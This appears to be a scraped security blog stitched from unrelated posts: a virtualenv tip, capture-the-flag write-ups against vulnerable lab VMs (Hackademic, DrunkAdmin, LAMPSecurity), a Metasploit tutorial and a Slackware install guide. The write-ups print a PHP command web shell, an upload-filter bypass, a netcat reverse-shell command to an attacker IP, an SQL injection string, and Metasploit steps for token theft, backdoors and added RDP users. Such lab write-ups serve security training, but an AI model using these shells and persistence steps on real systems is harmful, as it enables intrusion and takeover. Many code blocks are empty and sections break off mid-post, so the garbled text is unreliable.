<p>When working with virtual environments, it might be helpful to take a snapshot of your installed packages and their versions, in case you want to recreate the environment later. You can do this with <code>pip freeze > requirements.txt</code>. Check the newly created file for a list of your snapshotted items. In my case, I only installed requests in my environment so far:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat requirements.txt 
</span><span class='line'>requests==2.10.0</span></code></pre></td></tr></table></div></figure>


<p>If you need the exact same environment later, maybe to let some one of your team to work on the project, you can install the same packages and versions with the command <code>pip install -r requirements.txt</code></p>

<h2>virtualenvwrapper</h2>

<p>To make working with virtual environments even more convenient, you can use <em>virtualenvwrapper</em>, which provides wrappers for managing your environments and helps keep all your environments in one place. It also allows you to switch between environments with only one command, and has tab completion.</p>

<p>First, install it (outside your environments), with <code>pip install virtualenvwrapper</code>.</p>

<p>Then you need to add a few lines to your shell startup script. In my <code>~/.bashrc</code> file, I added the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># set the location where your virtual environments will be stored
</span><span class='line'>export WORKON_HOME=$HOME/.virtualenvs
</span><span class='line'># set the location of the virtualenvwrapper script (where it was installed)
</span><span class='line'>source /usr/local/bin/virtualenvwrapper.sh</span></code></pre></td></tr></table></div></figure>


<p>Now reload the startup file: <code>source ~/.bashrc</code> and you will see that your .virtualenvs folder has been created and populated with some scripts. Let&rsquo;s look at the help menu to see the available commands:</p>

<h1>Recon</h1>

<p>Again, this will be a web hacking mission, only web server is available.</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/hackademic/rtb2-web.png" title="hackademic" alt="hackademic website"></p>

<p>There was nothing in the source code, no suspicious headers, no sql injection in the login. I ran OpenVAS, Dirbuster and Nikto on the target, but nothing more was uncovered other than a Phpmyadmin interface, which kept giving me &ldquo;unable to connect to MySQL server&rdquo; errors no matter what I did. I assumed that maybe the web server is a false front and that might be something else hidden on the machine, so I ran a UDP scan next, which revealed an additional port:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>

</span><span class='line'>PORT     STATE SERVICE  REASON
</span><span class='line'>5353/udp open  zeroconf udp-response ttl 255</span></code></pre></td></tr></table></div></figure>


<p>Further internet research and a version scan implied that this was the <a href="https://en.wikipedia.org/wiki/Multicast_DNS">Multicast DNS</a> protocol. I couldn&rsquo;t find anything to exploit it, though. But it made me want to take a closer look at Nmap&rsquo;s results again, so I ran another scan:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>

<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap  -p- 192.168.80.166
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.49BETA5 ( https://nmap.org ) at 2016-07-21 08:14 EDT
</span><span class='line'>Nmap scan report for 192.168.80.166

</span><span class='line'>80/tcp open  http    syn-ack ttl 64</span></code></pre></td></tr></table></div></figure>


<p>This time I read it more carefully and I noticed it reported a filtered port. I ran Nmap again with the verbose flags and <code>&mdash;packet-trace</code> option and this time it returned a new port:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>

</span><span class='line'>666/tcp open  doom    syn-ack ttl 64</span></code></pre></td></tr></table></div></figure>


<p>This must have been the previously reported as filtered port. Version scanning revealed that this was actually another web server!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>666/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.14 ((Ubuntu))</span></code></pre></td></tr></table></div></figure>


<p>Before continuing, I am taking a detour here because it seems I had bypassed a secion of the challenge. When I came back to resume working on this VM, I couldn&rsquo;t get the 666 port to open, and I had no idea what triggered it. I looked at g0tmi1lk&rsquo;s video and it turns out there is a SQLi string that you can insert into the password field of the first web server that gives you a different response. The string is <code>&lsquo; or 1=1&mdash;&rsquo;</code>. I previously tested this parameter with sqlmap and also inserting another variation of this string, with no satisfactory answer. I assumed maybe it&rsquo;s hardcoded, because the slightest change, as in putting a space after the comment character invalidates it. Anyway, with this injection attempt you are taken to a page that says &ldquo;Ok, nice shot&hellip;&hellip;but, you are looking in a wrong place bro! ;&ndash;)&rdquo;. In the source, there was a URL encoded string:</p>

<p>Alright, this is a reference to <a href="https://en.wikipedia.org/wiki/Port_knocking">port knocking</a>. I further decoded the binary data to ascii by using <a href="http://www.snarkles.net/scripts/sneak/sneak.php">this site</a> and got the string <em>1001:1101:1011:1001</em>. So I assumed this string will need to be given to the host in order to open up the port.</p>

<p>Indeed, now the 666 port was opened. Not sure how I previously got to it without going through the sequence</p>

<p>Ok, back to hacking! First thing I noticed was a really old Joomla version, so I fired up <code>joomscan</code> and among the 4 vulnerabilities found, I show here one that seemed more interesting:</p>

<h1>Exploit</h1>

<p>I visited those directories but there was nothing interesting. The administrator one contained a message stating that I am not the real administrator. So I went back to testing for SQLi in the login page and in the URL parameters. In particular, I was interested by the <em>Itemid</em> parameter. When I tampered with it, I got messages that I need to login to view that area of the site. I used sqlmap but no vulnerability found. Seeing so many parameters in the URL, I decided to test each one of them by visiting every page and trying a single quote in every parameter. And the jackpot was found at the <code>letter</code> parameter in the List contents page:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

</span><span class='line'>'</span></code></pre></td></tr></table></div></figure>


<p>With this information, I pointed sqlmap to the vulnerable parameter and retrieved the jos_users table of the joomla database, where among others, there were usernames and password hashes</p>

<p>Well, these hashes won&rsquo;t help much, as a quick search didn&rsquo;t give me any way to crack them fast and easy. I did research a bit on the internet and found out that these are salted hashes, stored in the format <code>md5 hash:salt</code>. I also found there is a Perl script that can help with cracking such hashes, called <a href="http://morxploit.com/joomlacrack.txt">joomlacrack.pl</a>. But I thought I might not need to crack them if I could use sqlmap to execute commands on the server and write a PHP backdoor there. So that&rsquo;s what I tried next. Passing <em>pwd</em> to <em>&mdash;os-cmd</em> gave me the location of the current directory, which is /var/www. I tried writing a shell directly in this location but I failed. So next I listed the contents of the present directory and noticed a <em>configuration.php</em> file that I read, and inside there were credentials for the database:</p>

</span><span class='line'>var $dbprefix = 'jos_';</span></code></pre></td></tr></table></div></figure>


<p>I went to the phpmyadmin interface and logged in as root. Then I was able to use SQL to create a rudimentary shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

</span></code></pre></td></tr></table></div></figure>


<p>After uploading this shell, I used to download the reverse PHP shell that I hosted with Python&rsquo;s SimpleHTTPServer. And then I navigated to it and received the connection on my Netcat listener:</p>

<p>The local exploit that worked was the same one I used in the previous Hackademic challenge, the <a href="https://www.exploit-db.com/exploits/15285/">RDS Protocol Local Privilege Escalation exploit</a>. Again, I used wget to download it from my machine and ran it:</p>

</span><span class='line'>Key.txt</span></code></pre></td></tr></table></div></figure>


<p>Trying to read the key gave a huge base64 encoded string, so I copied it to the web server directory, gave it permissions for everyone, and then I downloaded it on my machine, where I could decode it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

<p>So it&rsquo;s an image! (when I tried reading it there was binary garbage, so I assumed it must be another type of file than a text one). I used this <a href="http://codebeautify.org/base64-to-image-converter">base64 to image converter</a> to see the image:</p>

<h1>Debriefing</h1>

<p>This host implemented a sneaky defense of port knocking in order to serve the second web server. It was a bit unrealistic to require a hardcoded value for the password parameter on the first web server in my opinion. The second server was vulnerable to real SQL injection that could read files on the system and execute commands. Having the database root credentials readily available allowed me to gain a foothold on the machine, from which the only step left was finding an exploit that would give me root.</p>

<p>Get root and read the contents of the file &lsquo;key.txt&rsquo; in the root directory.</p>

<h1>Recon</h1>

<p>I started with a port scan of the target, but only the 80 port is open:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/hackademic/rtb1-web.png" title="hackademic" alt="hackademic website"></p>

<p>I looked at the links and noticed the URL for the post is <a href="http://192.168.80.162/Hackademic_RTB1/?p=9">http://192.168.80.162/Hackademic_RTB1/?p=9</a> and for the archives is <a href="http://192.168.80.162/Hackademic_RTB1/?cat=1">http://192.168.80.162/Hackademic_RTB1/?cat=1</a> . Before going to Sqlmap, I manually inserted quotes in the URLs and sure enough, a SQL error for the cat parameter:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/hackademic/rtb1-sqli.png" title="sqli" alt="sql error"></p>

<h1>Exploit</h1>

<p>Next I enumerated the databases with Sqlmap:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

<p>Since this is a web-based challenge, I proceeded to look into the wordpress database:</p>

<p>I further enumerated the wp_users table and here I am showing only the relevant information:</p>

<p>Cracking the hashes revealed the passwords of all the users:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

<p>Then I went to the Wordpress login page at <a href="http://192.168.80.162/Hackademic_RTB1/wp-login.php">http://192.168.80.162/Hackademic_RTB1/wp-login.php</a> and logged in as NickJames (assumed he was admin because of his password). But there was nothing extraordinary to be done with his privileges, just adding and editing posts. We have more users to try  though! When I reached GeorgeMiller, I noticed there were more actions available in the admin panel:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/hackademic/rtb1-panel.png" title="dashboard" alt="admin panel"></p>

<p>In the Presentation tab I could edit themes for the site. I picked the 404.php file and replaced its content with a line that would echo something first, so I don&rsquo;t waste my time with shells without checking if code is executed successfully.</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/hackademic/rtb1-404.png" title="404.php" alt="php file edited"></p>

<p>When I went to the <a href="http://192.168.80.162/Hackademic_RTB1/wp-content/themes/starburst/404.php">http://192.168.80.162/Hackademic_RTB1/wp-content/themes/starburst/404.php</a> URL, I saw RCE displayed, so next I used the now-familiar reverse PHP shell from pentestmonkey. Set up my listener and visited the URL again to receive the shell:</p>

<h2>Privilege escalation</h2>

<p>The shell kept echoing back the commands I was running but otherwise it worked fine. I didn&rsquo;t find anything interesting that I could use during local enumeration, so I then searched for privilege escalation exploits that might apply to the kernel version 2.6.31 found on the box. The exploit that worked was the <a href="https://www.exploit-db.com/exploits/15285/">RDS privilege escalation exploit</a> by Dan Rosenberg. You can also find it on Kali with Searchsploit. I compiled it on my machine with the <em>-m32</em> flag for the target architecture and transfered it via netcat. Then I ran it and I stared a bit at the blinking cursor before confirming that it gave me root:</p>

<h1>Debriefing</h1>

<p>The machine looked pretty tightly locked with only a web server running. But the WordPress version was contained a known SQLi exploit that handed down the hashes for the users. One user had the rights to upload code on the server and facilitated geting (limited) access on the target. The kernel was vulnerable to a local root exploit, and from there it was game over.</p>

<p>GG, nice VM! Now let&rsquo;s end with some wisdom straight from the cow&rsquo;s mouth:</p>

<p>The challenge includes an image hosting web service that has various design vulnerabilities. You must enumerate the various web service features and find an exploitable vulnerability in order to read system hidden files. The web application is 100% custom so do not try to search google for relative PoC exploit code.</p>

<p>FINAL GOAL: Reveal the hidden message for a date arrange that Bob sent to Alice.</p>

<h1>Recon</h1>

<p>Started with an Nmap scan, I only keep here the relevant output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

<p>As you can see, the box is pretty tightly locked. Oh well, we knew from the challenge title that it was going to be web-based. So let&rsquo;s see what&rsquo;s on the web server</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/drunkadmin/tripios.png" title="tripios" alt="tripios image hosting"></p>

<p>And on the Info tab there is this very appealing request to report any vulnerabilities we may find with the site:
<code>Developer was really drunk while writting these code lines. Act like a pro and report any security flaws that you spotted around.</code></p>

<h1>Exploit</h1>

<p>First I uploaded a normal image which then gets displayed on the <em>image.php</em> page:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/drunkadmin/upload.png" title="upload" alt="uploaded image"></p>

<p>Next I uploaded a reverse PHP shell and changed the Content-Type header from application/x-php to image/png. This gave me an invalid file extension error. Then I tried again but this time I also changed the extension from PHP to PNG. Another error, saying &ldquo;you&rsquo;re naughty&rdquo;. This error kept flagging all my other attempts (tried uploading with double extensions or keeping just the PNG magic number and rest PHP code). So I went back to the start and once again found out that something I had dismissed as unimportant would play an important role in exploiting the target.</p>

<p>When uploading a correct image, I noticed a cookie was set: <code>trypios=246f7045b13ca34bd0fb443a038605de</code>. And when I looked at the image source, which I should have done in the first place, it looked like this: <code>images/246f7045b13ca34bd0fb443a038605de.png</code>.</p>

<p>Now I know where to access my uploaded files, but I still couldn&rsquo;t upload any PHP file. I remembered the mission briefing that stated this is a custom application and I thought there might be a filter that could catch the reverse shell, so I wrote a one line PHP script that simply echoes back a message. Thought it might be deemed harmless enough if there is a filter in place. And I finally managed to fool the application into uploading it by simply giving it a double extension of <code>.png.php</code> (something that I had tried before with the reverse shell and it got caught).</p>

<p>However, after successfully uploading it, my &ldquo;cool image&rdquo; wasn&rsquo;t displayed at all, and it didn&rsquo;t exist in the source either. I navigated directly to where it should be (based on the cookie value), which in my case was at <a href="http://192.168.80.160:8880/images/178eaa4e889ab53ce844344ffc945171">http://192.168.80.160:8880/images/178eaa4e889ab53ce844344ffc945171</a></p>

<p>And boom! The string &ldquo;RCE possible&rdquo; was displayed, which is exactly what I had my script outputting! The key takeaway here was that <strong>the file upload vulnerability was easily exploited by adding a double extension, but there was also a filter in place that flagged certain PHP code and prevented the upload</strong>. Because I could get code execution with a simple echo script, but not with the reverse shell.</p>

<p>With this information, I made another simple script to see if I can get command execution on the target:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="k">echo</span> <span class="nb">exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>When I tried uploading it&hellip;again the naughty message! Clearly some filtering is in place. I modified it again to:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">echo</span> <span class="nb">exec</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>It got uploaded without a problem and it displayed www-data when I went to it. So it appears that $<em>GET triggered the filter. I tried again, this time with $</em>REQUEST:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">echo</span> <span class="nb">exec</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
</span></code></pre></td></tr></table></div></figure>


<p>And the filter didn&rsquo;t trigger! I went to it and passed the <em>pwd</em> command and success! It displayed /var/www/images. So command execution on the host finally achieved. I tweaked it a bit to give me a reverse shell, because it would be inconvenient to navigate the filesystem in its current state. So I had netcat listen on my 5555 port and then sent a shell from the remote host with <code>cmd=nc -c /bin/sh 192.168.80.158 5555</code></p>

<p>Now that I&rsquo;m the system, time to look around for the secret message:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

<p>I looked in Bob&rsquo;s directory and found some PHP files but none contained any message. So I took a look at the <code>/var/www</code> as well:</p>

<p>All right, found the right one! I tried to decode that string but didn&rsquo;t get any intelligible output. This time though, all those PHP files that I found in bob&rsquo;s home directory would come in handy! There is a <em>public_html</em> file in bob&rsquo;s home with files that encrypt and decrypt passwords.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

</span><span class='line'>encrypt.php
</span><span class='line'>include
</span><span class='line'>index.php</span></code></pre></td></tr></table></div></figure>


<p>I copied the contents of the files to the <em>/var/www/images</em> directory and then I checked that index.php file:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/drunkadmin/secret.png" title="secret" alt="secret decryption"></p>

<p>But when I gave it the string <code>TGglMUxecjJDSDclN1Ej</code> I got garbage. Now, one of the things I tried before was to base64 decode the string. The output I got was <code>Lh%1L<sup>r2CH7</sup>%7Q#</code>, which didn&rsquo;t really help. Since I couldn&rsquo;t decrypt the secret with the form either, I thought to double check what kind of encoding it might use. And because I was thinking base64 but not sure, I inspired myself from a <a href="https://stackoverflow.com/questions/11656115/decode-python-base64-string">Stack Overflow post</a> to check if the string really is base64 in Python:</p>

</span></code></pre></td></tr></table></div></figure>


<p>And the the script did return the same output that I had decoded earlier: <code>Lh%1L<sup>r2CH7</sup>%7Q#</code>. So this time, I tried to enter this string in the decrypt form..and the message was revealed!</p>

<p><code>Alice, prepare for a kinky night. Meet me at &lsquo;35.517286&rsquo; &lsquo;24.017637&rsquo;</code></p>

<p>Yes! The message was decrypted and challenge completed! I was curious though and looked at the coordinates in Google Maps. It seems that Bob and Alice&rsquo;s chosen place of fun is a location in Greece:</p>

<p>Before wrapping up, do you remember the upload filter that caught the malicious uploads and gave a naughty message? I took a peek at it and here&rsquo;s the filter part:</p>

<p>Nice twist on this file upload vulnerability!</p>

<h1>Report</h1>

<p>This was another interesting challenge that seemed straightforward at the beginning but required more trial and error to solve. The steps that led to the exploitation were:</p>

<ul>
<li><p>server was vulnerable to unrestricted file upload that led to remote code execution</p></li>
<li><p>the filter that tried to protect against malicious code didn&rsquo;t stop everything that an attacker could use</p></li>
<li><p>the hidden file was not so hidden in the <em>/var/www</em> directory</p></li>
<li><p>files in Bob&rsquo;s home folder were readable, allowing the decryption of the secret message</p></li>
</ul>


<p>The key takeaway for me was to start simple and build from there when testing stuff. I would have saved so much time if I had tried a simple PHP code execution test, instead of throwing reverse shells and scratching my head when it didn&rsquo;t work</p>

<p>And today, instead of a cookie, I leave here the picture that gets displayed when you go to a non existent page on the server:</p>

<h1>Msfconsole</h1>

<p>The <code>msfconsole</code> (Metasploit Framework Console) is where you will be spending most of your time when working with Metasploit. You can do almost everything from here, but the amount of commands might seem overwhelming at first.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/metasploit/msfbanner.png" title="msfconsole" alt="metasploit framework"></p>

<p>Besides the Metasploit functionality, you <strong>can run external commands in the console</strong>, which is really helpful.</p>

</span><span class='line'>Description:
</span><span class='line'>  This module exploits a parsing flaw in the path canonicalization 
</span><span class='line'>  code of NetAPI32.dll through the Server Service. This module is 
</span><span class='line'>  capable of bypassing NX on some operating systems and service packs. 
</span><span class='line'>  The correct target must be used to prevent the Server Service (along 
</span><span class='line'>  with a dozen others in the same process) from crashing. Windows XP 
</span><span class='line'>  targets seem to handle multiple successful exploitation events, but 
</span><span class='line'>  2003 targets will often crash or hang on subsequent attempts. This 
</span><span class='line'>  is just the first version of this module, full support for NX bypass 
</span><span class='line'>  on 2003, along with other platforms, is still in development.

<h1>Payload types</h1>

<p>There are 3 types of payloads that you can use with your exploits.</p>

<ul>
<li><p><strong>singles</strong> are standalone payloads that have everything needed to run by themselves. They are reliable but their size might be a detriment with some exploits</p></li>
<li><p><strong>stagers</strong> are small and are designed to establish a connection between attacker and victim and download additional components for the exploit as needed</p></li>
<li><p><strong>stages</strong> have various functionalities and are downloaded by the stagers to be run on the remote host</p></li>
</ul>


<h2>Payload generation</h2>

<h1>Working with the database</h1>

<p>Metasploit is backed by a powerful database that you can use to organize and classify the information. First, you have to start the PostgreSQL server: <code>service postgresql start</code>. Then you create and initialize the database after starting Metasploit with the <code>msfdb init</code> command.</p>

<p>Let&rsquo;s look at the database commands:</p>

<p>Chances are, you will want to keep your targets organized and separate from each other. For this, you can build different workspaces for every one:</p>

<p>Let&rsquo;s say that you want a separate workspace for your lab target. You can add it and all the subsequent information will be saved in this workspace:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

<p>Now let&rsquo;s populate this workspace with some information about the target. I ran a <code>db_nmap</code> scan on the box and then I looked at the hosts data:</p>

<h1>Meterpreter</h1>

<p>Next, let&rsquo;s look at Meterpreter, the king of payloads. Meterpreter has no disk presence because it only exists in memory, and it leaves no trail behind of created processes because it injects itself in currently running processes. To top it off, its traffic is encrypted. I will show Meterpreter in action here, but this time, the target is a Windows 7 machine.</p>

<p>I&rsquo;ve already set up the exploit:</p>

<h3>Token impersonation</h3>

<p>We owned an administrator account. But we want even more privileges. We can use the <em>incognito</em> module to steal the SYSTEM token for ourselves:</p>

<h3>Remote Desktop</h3>

<p>Another way we can get access to the system is via Remote Desktop:</p>

<p>Let&rsquo;s use it to enable Remote Desktop on the target and add our own user:</p>

<p>And to check if it worked, we can use the <em>rdesktop</em> client like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

<p><img class="center" src="http://chousensha.github.io/images/tools/metasploit/rd.png" title="remote desktop" alt="remote desktop session on hacked machine"></p>

<p>However, this is not very stealthy, because if another user is logged in, they will be disconnected. Anyway, better clean up after ourselves when we&rsquo;re done:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

<p>Despite the error above, the user was removed from the logon session. However, some files of that user remained behind and I had to manually delete them</p>

<h3>Packet sniffing</h3>

<p>Further on, we can enable a packet sniffer on the target to gather more sensitive information:</p>

<p>Now we can start sniffing:</p>

<h3>Backdooring the system</h3>

<p>If you want to maintain your presence on the target system, Metasploit has two types of backdoors that can be installed as a service on the target. However, keep in mind that they don&rsquo;t have any authentication, so best not leave them around on computers outside a lab environment &ndash; you don&rsquo;t want to open the door for everyone else in the world.</p>

<p>Success! This demo was pretty straightforward, but if executables attract too much attention on the target, you can try to sneak your payload into PDFs or Word documents instead.</p>

<h5>Conclusion</h5>

<p>This was a long post, but I wanted to showcase many of Metasploit&rsquo;s capabilities. It was a fun lab, but I barely scratched the surface of what&rsquo;s possible.</p>

<p>I searched for exploits for the versions of the listed services, but I couldn&rsquo;t find anything usable. So it&rsquo;s back to the web server..</p>

<h4>Web server</h4>

<p>The website provides some potential entry points that we&rsquo;ll have to take a closer look at:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/ctf5/phake.png" title="phake home" alt="phake org"></p>

<p>We can register for a mailing list:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/ctf5/list.png" title="mail list" alt="mailing list"></p>

<p>Tampering with the about page URL <code><a href="http://192.168.80.154/?page=about">http://192.168.80.154/?page=about</a></code> gives errors, so LFI might be possible</p>

<p>The blog page also has an admin login page and another Squirrel Mail page:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/ctf5/blog.png" title="blog" alt="blog"></p>

<p>The contact form allows you to send a message to the staff, and there is another app that acts as an event manager:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/ctf5/event.png" title="event manager" alt="event planner"></p>

<p>Also, on port 901 there is a Samba SWAT server protected by basic authentication. This server provides a web-based interface for configuring Samba.</p>

<h3>Exploiting the CMS</h3>

<p>I made an account on the event manager, but that doesn&rsquo;t seem to help me much besides creating new blog posts. Next I tested to see if there might be any SQLi in the contact form, but no luck there either. And despite the path traversal error, I wasn&rsquo;t able to navigate to any arbitrary files on the system.</p>

<p>It turns out I had actually overlooked an important information. On Andy Carp&rsquo;s blog, we can see the site is powered by NanoCMS. I noticed it but I didn&rsquo;t give it any thought. When I finally thought to click on it and learn more, it took me to a domain-for-sale page, so I figured it might be some simulated CMS created for this challenge only. Good that I thought to google it and see how wrong I was :p <a href="https://github.com/kalyan02/NanoCMS">NanoCMS</a> is a lightweight CMS based on PHP that is now discontinued. However, I found a super useful <a href="http://www.madirish.net/304">NanoCMS security review</a> that made possible the compromising of the target ;)</p>

<p>Among the vulnerabilities present in the CMS, there is one that allows unrestricted access to the <code>/data/pagesdata.txt</code>. This file contains the username and password hash of the administrator:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

<p>I cracked the hash with my favorite <a href="https://hashkiller.co.uk/md5-decrypter.aspx">online cracker</a> and found out the password is <em>shannon</em>. Next, I logged in to the admin panel:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/ctf5/nanocms.png" title="nanocms admin panel" alt="admin panel"></p>

<p>Now we have the ability to add new pages with our own PHP code. I used <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">pentestmonkey&rsquo;s reverse PHP shell</a>. I changed the IP and port, and set up a netcat listener to catch the reverse connection. Then I clicked on the newly created page on the blog and looked to my netcat for the goodies:</p>

<p>I looked inside them with <code>ls -al</code>. The content was very similar among them and I could find nothing interesting in the files I was allowed to read. Until patrick&rsquo;s directory, that contained more hidden files than the others:</p>

<p>Now all that is left is to become root! I SSH&#8217;ed with the root credentials and the machine is mine now!</p>

<h5>Concluding remarks</h5>

<p>This was another cool challenge in the LAMPSecurity series! The exploitation was possible because of the vulnerable CMS that not only disclosed credentials, but also allowed an attacker to execute code on the target. Although the foothold gained was under an unprivileged user, certain files of the home directories were readable when they shouldn&rsquo;t have been, and the root password was sitting in an unprotected file for anyone to read. A good example of how a chain of misconfigurations can lead to total compromise of a machine.</p>

    <updated>2016-04-28T13:23:59-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/04/28/slackware-install-guide</id>
    <content type="html"><![CDATA[<p>Ever since I got into Linux and wanting to learn more and get better at it, I always held an interest towards Slackware. Being one of the oldest distributions around, with a hardcore community and an old-school reputation, it always came in the top answers when it comes to learning Linux without fancy hand holding and the like (along with Arch). But I always liked Slackware, its name is awesome, and well, slackwarez for a slacker! So I&rsquo;ve finally set up some time to install it in a VM, and will get to work on it to deepen my Linux knowledge.</p>

<p>So in this post I will list the steps I went through to install Slackware 14.1 in VMware.</p>

<!-- more -->


<p>The cool thing about this installation was that I had to do some things manually without a GUI where all you do is press next. After selecting your installation media, which was the DVD ISO for me, power up the machine and you will get some command line action!</p>

<p>The first screen is for selecting which kernel to boot to</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/bootkernel.png" title="boot to kernel" alt="kernel booting"></p>

<p>Select keyboard map</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/keyboard.png" title="keyboard map" alt="select key map"></p>

<p>Log in as root</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/root.png" title="root login" alt="root login"></p>

<h3>Partitioning</h3>

<p>You have to set up partitions before beginning the installation process</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/partition.png" title="partition" alt="partitioning"></p>

<p>I will use cfdisk for this. As you can see, my disk is /dev/sda and is yet yet unpartitioned, so just a big lump of free space.</p>

<blockquote><p>cfdisk &ndash; display or manipulate a disk partition table</p></blockquote>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/cfdisk.png" title="cfdisk" alt="cfdisk"></p>

<p>I will make 3 partitions, for swap, root and home. Select [New] to create a new partition. The MBR partitioning scheme supports up to 4 primary partitions, and if you need more than that you can make one of them an extended partition and create  logical partitions inside it. Choose [Primary] to continue</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/primary.png" title="primary partition" alt="primary partition"></p>

<p>Since this will be the swap partition, I will make it a size of 512 MB.</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/size.png" title="partition size" alt="swap size"></p>

<p>Next I selected to place it at the beginning of the drive, for simplicity. I&rsquo;ve also read that doing so might make it faster.</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/beginning.png" title="partition beginning" alt="beginning partition"></p>

<p>Note how the first partition labeled sda1 was created. Next you have to choose the partition&rsquo;s type</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/type.png" title="partition type" alt="partition type"></p>

<p>See how many different file systems can be created. Choose 82 for swap.</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/swap.png" title="type swap" alt="swap partition"></p>

<p>Next make the root and home partitions, as described above. Only difference will be that you need to make the root partition bootable</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/bootable.png" title="bootable partition" alt="root bootable"></p>

<p>Now write the changes to disk. You will be asked to confirm that you want to write the data</p>

<p><img class="center" src="http://chousensha.github.io/images/sysadmin/slackware/write.png" title="write partitions" alt="write data"></p>

<p>After it&rsquo;s done you will see a message at the bottom: &ldquo;Wrote partition table to disk&rdquo;. You can quit cfdisk now</p>

